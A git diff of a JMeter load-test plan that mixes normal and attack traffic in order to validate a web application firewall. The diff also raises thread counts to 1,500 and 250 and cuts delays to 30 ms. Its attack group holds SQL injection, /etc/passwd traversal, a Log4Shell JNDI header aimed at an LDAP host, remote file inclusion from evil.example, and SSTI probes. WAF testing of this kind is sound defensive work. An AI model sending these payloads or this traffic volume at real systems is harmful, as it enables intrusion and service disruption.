@@ -1,11 +1,9 @@
-<?xml version='1.0' encoding='utf-8'?>
+<?xml version="1.0" encoding="UTF-8"?>
 <jmeterTestPlan version="1.2" properties="5.0" jmeter="5.6.3">
   <hashTree>
-    <TestPlan guiclass="TestPlanGui" testclass="TestPlan" testname="Traffic 1H Log Plan" enabled="true">
+    <TestPlan guiclass="TestPlanGui" testclass="TestPlan" testname="Traffic 1H Log Plan">
       <stringProp name="TestPlan.comments">One-hour pilot derived from the 24-hour traffic plan. Keeps the same normal / boundary / attack / burst structure, but replaces TG4 with proven FP candidates from FP_BOARD_SEARCH_URL_EXPANDED_500_V2 so WAF-only 403 reductions are easier to observe before scaling back up to 24 hours.</stringProp>
-      <boolProp name="TestPlan.functional_mode">false</boolProp>
-      <boolProp name="TestPlan.serialize_threadgroups">false</boolProp>
-      <elementProp name="TestPlan.user_defined_variables" elementType="Arguments" guiclass="ArgumentsPanel" testclass="Arguments" testname="User Defined Variables" enabled="true">
+      <elementProp name="TestPlan.user_defined_variables" elementType="Arguments" guiclass="ArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
         <collectionProp name="Arguments.arguments">
           <elementProp name="protocol" elementType="Argument">
             <stringProp name="Argument.name">protocol</stringProp>
@@ -29,7 +27,7 @@
           </elementProp>
           <elementProp name="normal_threads" elementType="Argument">
             <stringProp name="Argument.name">normal_threads</stringProp>
-            <stringProp name="Argument.value">5</stringProp>
+            <stringProp name="Argument.value">1500</stringProp>
             <stringProp name="Argument.metadata">=</stringProp>
           </elementProp>
           <elementProp name="normal_ramp_seconds" elementType="Argument">
@@ -39,32 +37,32 @@
           </elementProp>
           <elementProp name="normal_base_delay_ms" elementType="Argument">
             <stringProp name="Argument.name">normal_base_delay_ms</stringProp>
-            <stringProp name="Argument.value">4500</stringProp>
+            <stringProp name="Argument.value">30</stringProp>
             <stringProp name="Argument.metadata">=</stringProp>
           </elementProp>
           <elementProp name="normal_random_delay_ms" elementType="Argument">
             <stringProp name="Argument.name">normal_random_delay_ms</stringProp>
-            <stringProp name="Argument.value">2000</stringProp>
+            <stringProp name="Argument.value">30</stringProp>
             <stringProp name="Argument.metadata">=</stringProp>
           </elementProp>
           <elementProp name="attack_base_delay_ms" elementType="Argument">
             <stringProp name="Argument.name">attack_base_delay_ms</stringProp>
-            <stringProp name="Argument.value">20000</stringProp>
+            <stringProp name="Argument.value">30</stringProp>
             <stringProp name="Argument.metadata">=</stringProp>
           </elementProp>
           <elementProp name="attack_random_delay_ms" elementType="Argument">
             <stringProp name="Argument.name">attack_random_delay_ms</stringProp>
-            <stringProp name="Argument.value">10000</stringProp>
+            <stringProp name="Argument.value">30</stringProp>
             <stringProp name="Argument.metadata">=</stringProp>
           </elementProp>
           <elementProp name="fp_base_delay_ms" elementType="Argument">
             <stringProp name="Argument.name">fp_base_delay_ms</stringProp>
-            <stringProp name="Argument.value">4000</stringProp>
+            <stringProp name="Argument.value">30</stringProp>
             <stringProp name="Argument.metadata">=</stringProp>
           </elementProp>
           <elementProp name="fp_random_delay_ms" elementType="Argument">
             <stringProp name="Argument.name">fp_random_delay_ms</stringProp>
-            <stringProp name="Argument.value">2000</stringProp>
+            <stringProp name="Argument.value">30</stringProp>
             <stringProp name="Argument.metadata">=</stringProp>
           </elementProp>
           <elementProp name="normal_login_email" elementType="Argument">
@@ -104,22 +102,20 @@
           </elementProp>
         </collectionProp>
       </elementProp>
-      <stringProp name="TestPlan.user_define_classpath" />
     </TestPlan>
     <hashTree>
-      <ThreadGroup guiclass="ThreadGroupGui" testclass="ThreadGroup" testname="TG1 Normal Traffic Continuous" enabled="true">
+      <ThreadGroup guiclass="ThreadGroupGui" testclass="ThreadGroup" testname="TG1 Normal Traffic Continuous">
         <stringProp name="TestPlan.comments">Pure normal baseline traffic. Keeps session-linked login, profile read, board browse, and lower-frequency board creation without failure or typo noise.</stringProp>
-        <elementProp name="ThreadGroup.main_controller" elementType="LoopController" guiclass="LoopControlPanel" testclass="LoopController" testname="TG1 Main Loop Controller" enabled="true">
+        <stringProp name="ThreadGroup.num_threads">${normal_threads}</stringProp>
+        <stringProp name="ThreadGroup.ramp_time">${normal_ramp_seconds}</stringProp>
+        <stringProp name="ThreadGroup.duration">${duration_seconds}</stringProp>
+        <boolProp name="ThreadGroup.same_user_on_next_iteration">true</boolProp>
+        <boolProp name="ThreadGroup.scheduler">true</boolProp>
+        <stringProp name="ThreadGroup.on_sample_error">continue</stringProp>
+        <elementProp name="ThreadGroup.main_controller" elementType="LoopController" guiclass="LoopControlPanel" testclass="LoopController" testname="TG1 Main Loop Controller">
           <stringProp name="LoopController.loops">1000000</stringProp>
           <boolProp name="LoopController.continue_forever">false</boolProp>
         </elementProp>
-        <stringProp name="ThreadGroup.num_threads">${normal_threads}</stringProp>
-        <stringProp name="ThreadGroup.ramp_time">${normal_ramp_seconds}</stringProp>
-        <boolProp name="ThreadGroup.same_user_on_next_iteration">true</boolProp>
-        <stringProp name="ThreadGroup.on_sample_error">continue</stringProp>
-        <boolProp name="ThreadGroup.scheduler">true</boolProp>
-        <stringProp name="ThreadGroup.duration">${duration_seconds}</stringProp>
-        <stringProp name="ThreadGroup.delay" />
       </ThreadGroup>
       <hashTree>
         <ConfigTestElement guiclass="HttpDefaultsGui" testclass="ConfigTestElement" testname="HTTP Request Defaults TG1" enabled="true">
@@ -128,17 +124,17 @@
           <stringProp name="HTTPSampler.protocol">${protocol}</stringProp>
           <stringProp name="HTTPSampler.contentEncoding">UTF-8</stringProp>
           <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-            <collectionProp name="Arguments.arguments" />
+            <collectionProp name="Arguments.arguments"/>
           </elementProp>
           <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
         </ConfigTestElement>
-        <hashTree />
+        <hashTree/>
         <CookieManager guiclass="CookiePanel" testclass="CookieManager" testname="HTTP Cookie Manager TG1" enabled="true">
-          <collectionProp name="CookieManager.cookies" />
+          <collectionProp name="CookieManager.cookies"/>
           <boolProp name="CookieManager.clearEachIteration">false</boolProp>
           <boolProp name="CookieManager.controlledByThreadGroup">false</boolProp>
         </CookieManager>
-        <hashTree />
+        <hashTree/>
         <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="TG1 Global Headers" enabled="true">
           <collectionProp name="HeaderManager.headers">
             <elementProp name="Host" elementType="Header">
@@ -159,14 +155,14 @@
             </elementProp>
           </collectionProp>
         </HeaderManager>
-        <hashTree />
+        <hashTree/>
         <UniformRandomTimer guiclass="UniformRandomTimerGui" testclass="UniformRandomTimer" testname="TG1 Uniform Random Timer" enabled="true">
           <stringProp name="RandomTimer.range">${normal_random_delay_ms}</stringProp>
           <stringProp name="ConstantTimer.delay">${normal_base_delay_ms}</stringProp>
         </UniformRandomTimer>
-        <hashTree />
+        <hashTree/>
         <TransactionController guiclass="TransactionControllerGui" testclass="TransactionController" testname="TG1 Login And Session" enabled="true">
-          <boolProp name="TransactionController.parent">false</boolProp>
+          <boolProp name="TransactionController.includeTimers">true</boolProp>
         </TransactionController>
         <hashTree>
           <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG1_login_success" enabled="true">
@@ -179,7 +175,7 @@
               <collectionProp name="Arguments.arguments">
                 <elementProp name="" elementType="HTTPArgument">
                   <boolProp name="HTTPArgument.always_encode">false</boolProp>
-                  <stringProp name="Argument.value">{"email":"${normal_login_email}","password":"${normal_login_password}"}</stringProp>
+                  <stringProp name="Argument.value">{&quot;email&quot;:&quot;${normal_login_email}&quot;,&quot;password&quot;:&quot;${normal_login_password}&quot;}</stringProp>
                   <stringProp name="Argument.metadata">=</stringProp>
                 </elementProp>
               </collectionProp>
@@ -199,14 +195,14 @@
                 </elementProp>
               </collectionProp>
             </HeaderManager>
-            <hashTree />
+            <hashTree/>
             <JSONPostProcessor guiclass="JSONPostProcessorGui" testclass="JSONPostProcessor" testname="Extract TG1 Access Token" enabled="true">
               <stringProp name="JSONPostProcessor.referenceNames">tg1_access_token</stringProp>
               <stringProp name="JSONPostProcessor.jsonPathExprs">$.accessToken</stringProp>
-              <stringProp name="JSONPostProcessor.match_numbers" />
+              <stringProp name="JSONPostProcessor.match_numbers"></stringProp>
               <stringProp name="JSONPostProcessor.defaultValues">NOT_FOUND</stringProp>
             </JSONPostProcessor>
-            <hashTree />
+            <hashTree/>
           </hashTree>
           <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG1_auth_me" enabled="true">
             <stringProp name="HTTPSampler.path">/api/auth/me</stringProp>
@@ -215,7 +211,7 @@
             <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
             <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
             <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-              <collectionProp name="Arguments.arguments" />
+              <collectionProp name="Arguments.arguments"/>
             </elementProp>
             <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
           </HTTPSamplerProxy>
@@ -232,11 +228,11 @@
                 </elementProp>
               </collectionProp>
             </HeaderManager>
-            <hashTree />
+            <hashTree/>
           </hashTree>
         </hashTree>
         <TransactionController guiclass="TransactionControllerGui" testclass="TransactionController" testname="TG1 Board Browse" enabled="true">
-          <boolProp name="TransactionController.parent">false</boolProp>
+          <boolProp name="TransactionController.includeTimers">true</boolProp>
         </TransactionController>
         <hashTree>
           <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG1_board_list" enabled="true">
@@ -246,7 +242,7 @@
             <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
             <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
             <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-              <collectionProp name="Arguments.arguments" />
+              <collectionProp name="Arguments.arguments"/>
             </elementProp>
             <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
           </HTTPSamplerProxy>
@@ -263,7 +259,7 @@
                 </elementProp>
               </collectionProp>
             </HeaderManager>
-            <hashTree />
+            <hashTree/>
           </hashTree>
           <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG1_board_detail_random" enabled="true">
             <stringProp name="HTTPSampler.path">/api/board/posts/${__Random(1,20,)}</stringProp>
@@ -272,7 +268,7 @@
             <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
             <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
             <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-              <collectionProp name="Arguments.arguments" />
+              <collectionProp name="Arguments.arguments"/>
             </elementProp>
             <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
           </HTTPSamplerProxy>
@@ -289,7 +285,7 @@
                 </elementProp>
               </collectionProp>
             </HeaderManager>
-            <hashTree />
+            <hashTree/>
           </hashTree>
         </hashTree>
         <IfController guiclass="IfControllerPanel" testclass="IfController" testname="TG1 Write Sampling 20 Percent" enabled="true">
@@ -299,7 +295,7 @@
         </IfController>
         <hashTree>
           <TransactionController guiclass="TransactionControllerGui" testclass="TransactionController" testname="TG1 Board Create Flow" enabled="true">
-            <boolProp name="TransactionController.parent">false</boolProp>
+            <boolProp name="TransactionController.includeTimers">true</boolProp>
           </TransactionController>
           <hashTree>
             <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG1_board_create" enabled="true">
@@ -312,7 +308,7 @@
                 <collectionProp name="Arguments.arguments">
                   <elementProp name="" elementType="HTTPArgument">
                     <boolProp name="HTTPArgument.always_encode">false</boolProp>
-                    <stringProp name="Argument.value">{"title":"24H Normal Post ${__time(yyyyMMddHHmmssSSS,)}","content":"Session-linked normal post from thread ${__threadNum} using real login token."}</stringProp>
+                    <stringProp name="Argument.value">{&quot;title&quot;:&quot;24H Normal Post ${__time(yyyyMMddHHmmssSSS,)}&quot;,&quot;content&quot;:&quot;Session-linked normal post from thread ${__threadNum} using real login token.&quot;}</stringProp>
                     <stringProp name="Argument.metadata">=</stringProp>
                   </elementProp>
                 </collectionProp>
@@ -336,17 +332,17 @@
                   </elementProp>
                 </collectionProp>
               </HeaderManager>
-              <hashTree />
+              <hashTree/>
               <JSONPostProcessor guiclass="JSONPostProcessorGui" testclass="JSONPostProcessor" testname="Extract TG1 Created Post Id" enabled="true">
                 <stringProp name="JSONPostProcessor.referenceNames">tg1_created_post_id</stringProp>
                 <stringProp name="JSONPostProcessor.jsonPathExprs">$.id</stringProp>
-                <stringProp name="JSONPostProcessor.match_numbers" />
+                <stringProp name="JSONPostProcessor.match_numbers"></stringProp>
                 <stringProp name="JSONPostProcessor.defaultValues">0</stringProp>
               </JSONPostProcessor>
-              <hashTree />
+              <hashTree/>
             </hashTree>
             <IfController guiclass="IfControllerPanel" testclass="IfController" testname="If TG1 Created Post Captured" enabled="true">
-              <stringProp name="IfController.condition">${__jexl3('${tg1_created_post_id}' != '0')}</stringProp>
+              <stringProp name="IfController.condition">${__jexl3(&apos;${tg1_created_post_id}&apos; != &apos;0&apos;)}</stringProp>
               <boolProp name="IfController.useExpression">true</boolProp>
               <boolProp name="IfController.evaluateAll">false</boolProp>
             </IfController>
@@ -358,7 +354,7 @@
                 <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
                 <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
                 <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-                  <collectionProp name="Arguments.arguments" />
+                  <collectionProp name="Arguments.arguments"/>
                 </elementProp>
                 <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
               </HTTPSamplerProxy>
@@ -375,7 +371,7 @@
                     </elementProp>
                   </collectionProp>
                 </HeaderManager>
-                <hashTree />
+                <hashTree/>
               </hashTree>
             </hashTree>
           </hashTree>
@@ -383,17 +379,16 @@
       </hashTree>
       <ThreadGroup guiclass="ThreadGroupGui" testclass="ThreadGroup" testname="TG1 Boundary Noise Continuous" enabled="true">
         <stringProp name="TestPlan.comments">Boundary-noise traffic separated from the pure normal baseline. Includes login failures and typo or 404-style requests only.</stringProp>
-        <elementProp name="ThreadGroup.main_controller" elementType="LoopController" guiclass="LoopControlPanel" testclass="LoopController" testname="TG1 Main Loop Controller" enabled="true">
+        <intProp name="ThreadGroup.num_threads">250</intProp>
+        <intProp name="ThreadGroup.ramp_time">20</intProp>
+        <stringProp name="ThreadGroup.duration">${duration_seconds}</stringProp>
+        <boolProp name="ThreadGroup.same_user_on_next_iteration">true</boolProp>
+        <boolProp name="ThreadGroup.scheduler">true</boolProp>
+        <stringProp name="ThreadGroup.on_sample_error">continue</stringProp>
+        <elementProp name="ThreadGroup.main_controller" elementType="LoopController" guiclass="LoopControlPanel" testclass="LoopController" testname="TG1 Main Loop Controller">
           <stringProp name="LoopController.loops">1000000</stringProp>
           <boolProp name="LoopController.continue_forever">false</boolProp>
         </elementProp>
-        <stringProp name="ThreadGroup.num_threads">1</stringProp>
-        <stringProp name="ThreadGroup.ramp_time">5</stringProp>
-        <boolProp name="ThreadGroup.same_user_on_next_iteration">true</boolProp>
-        <stringProp name="ThreadGroup.on_sample_error">continue</stringProp>
-        <boolProp name="ThreadGroup.scheduler">true</boolProp>
-        <stringProp name="ThreadGroup.duration">${duration_seconds}</stringProp>
-        <stringProp name="ThreadGroup.delay" />
       </ThreadGroup>
       <hashTree>
         <ConfigTestElement guiclass="HttpDefaultsGui" testclass="ConfigTestElement" testname="HTTP Request Defaults TG1" enabled="true">
@@ -402,17 +397,17 @@
           <stringProp name="HTTPSampler.protocol">${protocol}</stringProp>
           <stringProp name="HTTPSampler.contentEncoding">UTF-8</stringProp>
           <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-            <collectionProp name="Arguments.arguments" />
+            <collectionProp name="Arguments.arguments"/>
           </elementProp>
           <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
         </ConfigTestElement>
-        <hashTree />
+        <hashTree/>
         <CookieManager guiclass="CookiePanel" testclass="CookieManager" testname="HTTP Cookie Manager TG1" enabled="true">
-          <collectionProp name="CookieManager.cookies" />
+          <collectionProp name="CookieManager.cookies"/>
           <boolProp name="CookieManager.clearEachIteration">false</boolProp>
           <boolProp name="CookieManager.controlledByThreadGroup">false</boolProp>
         </CookieManager>
-        <hashTree />
+        <hashTree/>
         <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="TG1 Global Headers" enabled="true">
           <collectionProp name="HeaderManager.headers">
             <elementProp name="Host" elementType="Header">
@@ -433,14 +428,14 @@
             </elementProp>
           </collectionProp>
         </HeaderManager>
-        <hashTree />
+        <hashTree/>
         <UniformRandomTimer guiclass="UniformRandomTimerGui" testclass="UniformRandomTimer" testname="TG1 Uniform Random Timer" enabled="true">
           <stringProp name="RandomTimer.range">5000</stringProp>
           <stringProp name="ConstantTimer.delay">15000</stringProp>
         </UniformRandomTimer>
-        <hashTree />
+        <hashTree/>
         <TransactionController guiclass="TransactionControllerGui" testclass="TransactionController" testname="TG1 Boundary Noise" enabled="true">
-          <boolProp name="TransactionController.parent">false</boolProp>
+          <boolProp name="TransactionController.includeTimers">true</boolProp>
         </TransactionController>
         <hashTree>
           <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG1B_login_failure" enabled="true">
@@ -453,7 +448,7 @@
               <collectionProp name="Arguments.arguments">
                 <elementProp name="" elementType="HTTPArgument">
                   <boolProp name="HTTPArgument.always_encode">false</boolProp>
-                  <stringProp name="Argument.value">{"email":"${normal_login_email}","password":"Password123!x"}</stringProp>
+                  <stringProp name="Argument.value">{&quot;email&quot;:&quot;${normal_login_email}&quot;,&quot;password&quot;:&quot;Password123!x&quot;}</stringProp>
                   <stringProp name="Argument.metadata">=</stringProp>
                 </elementProp>
               </collectionProp>
@@ -473,7 +468,7 @@
                 </elementProp>
               </collectionProp>
             </HeaderManager>
-            <hashTree />
+            <hashTree/>
           </hashTree>
           <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG1B_url_typo" enabled="true">
             <stringProp name="HTTPSampler.path">/api/notfound/${__Random(100,999,)}</stringProp>
@@ -482,7 +477,7 @@
             <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
             <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
             <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-              <collectionProp name="Arguments.arguments" />
+              <collectionProp name="Arguments.arguments"/>
             </elementProp>
             <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
           </HTTPSamplerProxy>
@@ -495,23 +490,22 @@
                 </elementProp>
               </collectionProp>
             </HeaderManager>
-            <hashTree />
+            <hashTree/>
           </hashTree>
         </hashTree>
       </hashTree>
       <ThreadGroup guiclass="ThreadGroupGui" testclass="ThreadGroup" testname="TG2 WAF Detection Continuous" enabled="true">
         <stringProp name="TestPlan.comments">Low-rate unauthenticated or perimeter-focused attacks intended mainly to validate WAF, web access logs, and signature detection.</stringProp>
-        <elementProp name="ThreadGroup.main_controller" elementType="LoopController" guiclass="LoopControlPanel" testclass="LoopController" testname="TG2 Main Loop Controller" enabled="true">
+        <intProp name="ThreadGroup.num_threads">250</intProp>
+        <intProp name="ThreadGroup.ramp_time">10</intProp>
+        <stringProp name="ThreadGroup.duration">${duration_seconds}</stringProp>
+        <boolProp name="ThreadGroup.same_user_on_next_iteration">true</boolProp>
+        <boolProp name="ThreadGroup.scheduler">true</boolProp>
+        <stringProp name="ThreadGroup.on_sample_error">continue</stringProp>
+        <elementProp name="ThreadGroup.main_controller" elementType="LoopController" guiclass="LoopControlPanel" testclass="LoopController" testname="TG2 Main Loop Controller">
           <stringProp name="LoopController.loops">1000000</stringProp>
           <boolProp name="LoopController.continue_forever">false</boolProp>
         </elementProp>
-        <stringProp name="ThreadGroup.num_threads">1</stringProp>
-        <stringProp name="ThreadGroup.ramp_time">10</stringProp>
-        <boolProp name="ThreadGroup.same_user_on_next_iteration">true</boolProp>
-        <stringProp name="ThreadGroup.on_sample_error">continue</stringProp>
-        <boolProp name="ThreadGroup.scheduler">true</boolProp>
-        <stringProp name="ThreadGroup.duration">${duration_seconds}</stringProp>
-        <stringProp name="ThreadGroup.delay" />
       </ThreadGroup>
       <hashTree>
         <ConfigTestElement guiclass="HttpDefaultsGui" testclass="ConfigTestElement" testname="HTTP Request Defaults TG2" enabled="true">
@@ -520,17 +514,17 @@
           <stringProp name="HTTPSampler.protocol">${protocol}</stringProp>
           <stringProp name="HTTPSampler.contentEncoding">UTF-8</stringProp>
           <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-            <collectionProp name="Arguments.arguments" />
+            <collectionProp name="Arguments.arguments"/>
           </elementProp>
           <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
         </ConfigTestElement>
-        <hashTree />
+        <hashTree/>
         <CookieManager guiclass="CookiePanel" testclass="CookieManager" testname="HTTP Cookie Manager TG2" enabled="true">
-          <collectionProp name="CookieManager.cookies" />
+          <collectionProp name="CookieManager.cookies"/>
           <boolProp name="CookieManager.clearEachIteration">false</boolProp>
           <boolProp name="CookieManager.controlledByThreadGroup">false</boolProp>
         </CookieManager>
-        <hashTree />
+        <hashTree/>
         <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="TG2 Global Headers" enabled="true">
           <collectionProp name="HeaderManager.headers">
             <elementProp name="Host" elementType="Header">
@@ -551,12 +545,12 @@
             </elementProp>
           </collectionProp>
         </HeaderManager>
-        <hashTree />
+        <hashTree/>
         <UniformRandomTimer guiclass="UniformRandomTimerGui" testclass="UniformRandomTimer" testname="TG2 Uniform Random Timer" enabled="true">
           <stringProp name="RandomTimer.range">${attack_random_delay_ms}</stringProp>
           <stringProp name="ConstantTimer.delay">${attack_base_delay_ms}</stringProp>
         </UniformRandomTimer>
-        <hashTree />
+        <hashTree/>
         <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG2_attack_login_sqli" enabled="true">
           <stringProp name="HTTPSampler.path">/api/auth/login</stringProp>
           <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
@@ -567,7 +561,7 @@
             <collectionProp name="Arguments.arguments">
               <elementProp name="" elementType="HTTPArgument">
                 <boolProp name="HTTPArgument.always_encode">false</boolProp>
-                <stringProp name="Argument.value">{"email":"' OR '1'='1","password":"anything"}</stringProp>
+                <stringProp name="Argument.value">{&quot;email&quot;:&quot;&apos; OR &apos;1&apos;=&apos;1&quot;,&quot;password&quot;:&quot;anything&quot;}</stringProp>
                 <stringProp name="Argument.metadata">=</stringProp>
               </elementProp>
             </collectionProp>
@@ -587,7 +581,7 @@
               </elementProp>
             </collectionProp>
           </HeaderManager>
-          <hashTree />
+          <hashTree/>
         </hashTree>
         <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG2_attack_board_search_sqli" enabled="true">
           <stringProp name="HTTPSampler.path">/api/board/posts?keyword=%27%20UNION%20SELECT%201,2,3--</stringProp>
@@ -596,7 +590,7 @@
           <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
           <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
           <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-            <collectionProp name="Arguments.arguments" />
+            <collectionProp name="Arguments.arguments"/>
           </elementProp>
           <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
         </HTTPSamplerProxy>
@@ -609,7 +603,7 @@
               </elementProp>
             </collectionProp>
           </HeaderManager>
-          <hashTree />
+          <hashTree/>
         </hashTree>
         <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG2_attack_lfi" enabled="true">
           <stringProp name="HTTPSampler.path">/api/board/posts?keyword=..%2F..%2F..%2F..%2Fetc%2Fpasswd</stringProp>
@@ -618,7 +612,7 @@
           <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
           <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
           <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-            <collectionProp name="Arguments.arguments" />
+            <collectionProp name="Arguments.arguments"/>
           </elementProp>
           <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
         </HTTPSamplerProxy>
@@ -631,7 +625,7 @@
               </elementProp>
             </collectionProp>
           </HeaderManager>
-          <hashTree />
+          <hashTree/>
         </hashTree>
         <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG2_attack_log4shell_probe" enabled="true">
           <stringProp name="HTTPSampler.path">/api/board/posts</stringProp>
@@ -640,7 +634,7 @@
           <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
           <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
           <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-            <collectionProp name="Arguments.arguments" />
+            <collectionProp name="Arguments.arguments"/>
           </elementProp>
           <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
         </HTTPSamplerProxy>
@@ -653,11 +647,11 @@
               </elementProp>
               <elementProp name="User-Agent" elementType="Header">
                 <stringProp name="Header.name">User-Agent</stringProp>
-                <stringProp name="Header.value">${__groovy('$' + '{jndi:ldap://192.168.88.10/a}')}</stringProp>
+                <stringProp name="Header.value">${__groovy(&apos;$&apos; + &apos;{jndi:ldap://192.168.88.10/a}&apos;)}</stringProp>
               </elementProp>
             </collectionProp>
           </HeaderManager>
-          <hashTree />
+          <hashTree/>
         </hashTree>
         <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG2_attack_rfi" enabled="true">
           <stringProp name="HTTPSampler.path">/api/board/posts?keyword=http%3A%2F%2Fevil.example%2Fshell.txt</stringProp>
@@ -666,7 +660,7 @@
           <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
           <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
           <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-            <collectionProp name="Arguments.arguments" />
+            <collectionProp name="Arguments.arguments"/>
           </elementProp>
           <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
         </HTTPSamplerProxy>
@@ -679,7 +673,7 @@
               </elementProp>
             </collectionProp>
           </HeaderManager>
-          <hashTree />
+          <hashTree/>
         </hashTree>
         <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG2_attack_session_fixation" enabled="true">
           <stringProp name="HTTPSampler.path">/api/board/posts</stringProp>
@@ -688,7 +682,7 @@
           <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
           <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
           <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-            <collectionProp name="Arguments.arguments" />
+            <collectionProp name="Arguments.arguments"/>
           </elementProp>
           <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
         </HTTPSamplerProxy>
@@ -705,7 +699,7 @@
               </elementProp>
             </collectionProp>
           </HeaderManager>
-          <hashTree />
+          <hashTree/>
         </hashTree>
         <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG2_attack_ssti" enabled="true">
           <stringProp name="HTTPSampler.path">/api/board/posts?keyword=%24%7B7*7%7D</stringProp>
@@ -714,7 +708,7 @@
           <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
           <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
           <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-            <collectionProp name="Arguments.arguments" />
+            <collectionProp name="Arguments.arguments"/>
           </elementProp>
           <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
         </HTTPSamplerProxy>
@@ -727,7 +721,7 @@
               </elementProp>
             </collectionProp>
           </HeaderManager>
-          <hashTree />
+          <hashTree/>
         </hashTree>
         <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG2_attack_sqlmap_ua" enabled="true">
           <stringProp name="HTTPSampler.path">/api/board/posts</stringProp>
@@ -736,7 +730,7 @@
           <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
           <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
           <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-            <collectionProp name="Arguments.arguments" />
+            <collectionProp name="Arguments.arguments"/>
           </elementProp>
           <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
         </HTTPSamplerProxy>
@@ -753,7 +747,7 @@
               </elementProp>
             </collectionProp>
           </HeaderManager>
-          <hashTree />
+          <hashTree/>
         </hashTree>
